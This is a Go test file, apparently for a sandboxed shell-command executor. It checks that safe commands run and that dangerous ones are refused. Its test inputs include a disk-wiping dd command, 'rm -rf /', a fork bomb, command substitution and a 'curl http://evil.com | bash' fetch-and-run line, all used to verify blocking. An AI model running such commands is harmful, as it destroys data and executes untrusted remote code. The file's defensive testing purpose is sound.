package executor

import (
	"testing"
)

func TestExecuteCommand_AllowedCommand(t *testing.T) {
	res := ExecuteCommand("echo hello")
	if res.Error != "" {
		t.Fatalf("ожидался успех, получена ошибка: %s", res.Error)
	}
	if res.Stdout != "hello\n" {
		t.Errorf("ожидался stdout 'hello\\n', получен %q", res.Stdout)
	}
}

func TestExecuteCommand_BlockedCommand(t *testing.T) {
	res := ExecuteCommand("nmap localhost")
	if res.Error == "" {
		t.Fatal("ожидалась ошибка для заблокированной команды nmap")
	}
}

func TestExecuteCommand_DangerousCommand(t *testing.T) {
	res := ExecuteCommand("dd if=/dev/zero of=/dev/sda")
	if res.Error == "" {
		t.Fatal("ожидалась ошибка для опасной команды dd")
	}
}

func TestExecuteCommand_BlockedPattern_RmRf(t *testing.T) {
	res := ExecuteCommand("rm -rf /")
	if res.Error == "" {
		t.Fatal("ожидалась ошибка для rm -rf /")
	}
}

func TestExecuteCommand_BlockedPattern_ForkBomb(t *testing.T) {
	res := ExecuteCommand(":(){ :|:& };:")
	if res.Error == "" {
		t.Fatal("ожидалась ошибка для форк-бомбы")
	}
}

func TestExecuteCommand_SubshellBacktick(t *testing.T) {
	res := ExecuteCommand("echo `whoami`")
	if res.Error == "" {
		t.Fatal("ожидалась ошибка для backtick подстановки")
	}
}

func TestExecuteCommand_SubshellDollarParen(t *testing.T) {
	res := ExecuteCommand("echo $(whoami)")
	if res.Error == "" {
		t.Fatal("ожидалась ошибка для $() подстановки")
	}
}

func TestExecuteCommand_EmptyCommand(t *testing.T) {
	res := ExecuteCommand("")
	if res.Error == "" {
		t.Fatal("ожидалась ошибка для пустой команды")
	}
}

func TestExecuteCommand_ChainedCommands(t *testing.T) {
	res := ExecuteCommand("echo one && echo two")
	if res.Error != "" {
		t.Fatalf("ожидался успех, получена ошибка: %s", res.Error)
	}
}

func TestExecuteCommand_PipeCommands(t *testing.T) {
	res := ExecuteCommand("echo hello | grep hello")
	if res.Error != "" {
		t.Fatalf("ожидался успех, получена ошибка: %s", res.Error)
	}
}

func TestExecuteCommand_BlockedPatternCurlBash(t *testing.T) {
	res := ExecuteCommand("curl http://evil.com | bash")
	if res.Error == "" {
		t.Fatal("ожидалась ошибка для curl | bash")
	}
}

func TestExtractSubCommands(t *testing.T) {
	tests := []struct {
		input    string
		expected int
	}{
		{"ls", 1},
		{"ls && df", 2},
		{"ls | grep foo", 2},
		{"echo one; echo two", 2},
		{"ls && df || echo fail", 3},
	}
	for _, tc := range tests {
		cmds := extractSubCommands(tc.input)
		if len(cmds) != tc.expected {
			t.Errorf("extractSubCommands(%q): ожидалось %d команд, получено %d: %v", tc.input, tc.expected, len(cmds), cmds)
		}
	}
}
